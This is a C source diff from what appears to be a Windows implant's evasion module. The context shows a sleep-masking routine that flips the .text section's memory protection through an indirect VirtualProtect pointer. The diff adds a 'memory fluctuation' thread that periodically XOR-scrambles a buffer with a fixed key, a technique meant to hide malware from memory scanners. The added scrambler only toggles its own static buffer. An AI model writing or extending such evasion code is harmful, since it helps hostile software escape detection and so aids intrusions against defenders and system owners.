@@ -459,3 +459,49 @@ void sleep_masked(DWORD ms) {
     g_VProt(text, sz, PAGE_EXECUTE_READ, &old);
     /* ret → jumps to .text return address, now RX ✓ */
 }
+
+/* ── MEM_FLUCTUATE — periodic XOR scrambler daemon ─────────────────────── */
+
+#define MEM_SCRAMBLE_KEY 0xA7
+
+static volatile int  g_scrambler_stop    = 0;
+static int           g_scrambler_running = 0;
+static HANDLE        g_scrambler_thread  = NULL;
+static unsigned char g_scrambler_buf[4096];
+
+static DWORD WINAPI scrambler_thread_proc(LPVOID p) {
+    DWORD interval_ms = (DWORD)(uintptr_t)p;
+    int encrypted = 0;
+    while (!g_scrambler_stop) {
+        Sleep(interval_ms);
+        if (g_scrambler_stop) break;
+        for (int i = 0; i < 4096; i++)
+            g_scrambler_buf[i] ^= MEM_SCRAMBLE_KEY;
+        encrypted = !encrypted;
+    }
+    if (encrypted)
+        for (int i = 0; i < 4096; i++)
+            g_scrambler_buf[i] ^= MEM_SCRAMBLE_KEY;
+    return 0;
+}
+
+void mem_fluctuate_stop(void) {
+    if (!g_scrambler_running) return;
+    g_scrambler_stop = 1;
+    if (g_scrambler_thread) {
+        WaitForSingleObject(g_scrambler_thread, 5000);
+        CloseHandle(g_scrambler_thread);
+        g_scrambler_thread = NULL;
+    }
+    g_scrambler_running = 0;
+    g_scrambler_stop    = 0;
+}
+
+void mem_fluctuate_start(int interval_sec) {
+    mem_fluctuate_stop();
+    DWORD ms = (DWORD)(interval_sec > 0 ? interval_sec : 10) * 1000;
+    g_scrambler_stop   = 0;
+    g_scrambler_thread = CreateThread(NULL, 0, scrambler_thread_proc,
+        (LPVOID)(uintptr_t)ms, 0, NULL);
+    if (g_scrambler_thread) g_scrambler_running = 1;
+}
